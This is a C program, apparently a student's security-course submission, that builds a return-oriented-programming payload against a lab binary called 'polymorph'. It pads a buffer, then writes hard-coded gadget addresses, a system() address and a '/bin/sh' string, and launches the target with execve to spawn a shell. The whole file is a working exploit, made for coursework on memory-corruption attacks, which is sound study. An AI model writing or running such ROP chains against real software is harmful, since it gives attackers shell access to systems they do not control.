/*

Name: Vishruta Rudresh
Andrew ID: vrudresh
Question: 3   
Type: return-oriented-programming          

*/

/* Defining header files */
#include<stdio.h>


int main()
{
    char attack_string[4165];
    char *argv[]={"./polymorph","-f",attack_string,NULL};
    int i,j;
    for(i=0;i<4128;i++)
        attack_string[i]='v';
  
    attack_string[i++]=157;
    attack_string[i++]=134;
    attack_string[i++]=4;
    attack_string[i++]=8;

    attack_string[i++]=128;
    attack_string[i++]=209;
    attack_string[i++]=4;
    attack_string[i++]=8;

   //pop %register ; ret
    attack_string[i++]=175;  
    attack_string[i++]=180; 
    attack_string[i++]=226;  
    attack_string[i++]=183; 

 
    	/* system address - 1*/
    attack_string[i++]=95;
    attack_string[i++]=33;
    attack_string[i++]=228;
    attack_string[i++]=183;

    	//inc %register ; ret
    attack_string[i++]=200;  
    attack_string[i++]=211;  
    attack_string[i++]=224; 
    attack_string[i++]=183; 

	//call *%register
    attack_string[i++]=226; 
    attack_string[i++]=151;  
    attack_string[i++]=226;  
    attack_string[i++]=183;  

    	/* Address to /bin/sh */
    attack_string[i++]=188;
    attack_string[i++]=225;
    attack_string[i++]=4;   
    attack_string[i++]=8;  

    attack_string[i++]='/';
    attack_string[i++]='b';
    attack_string[i++]='i';
    attack_string[i++]='n';
    attack_string[i++]='/';
    attack_string[i++]='s';
    attack_string[i++]='h';
    attack_string[i++]='\0';

    j=execve("./polymorph",argv,NULL);


}


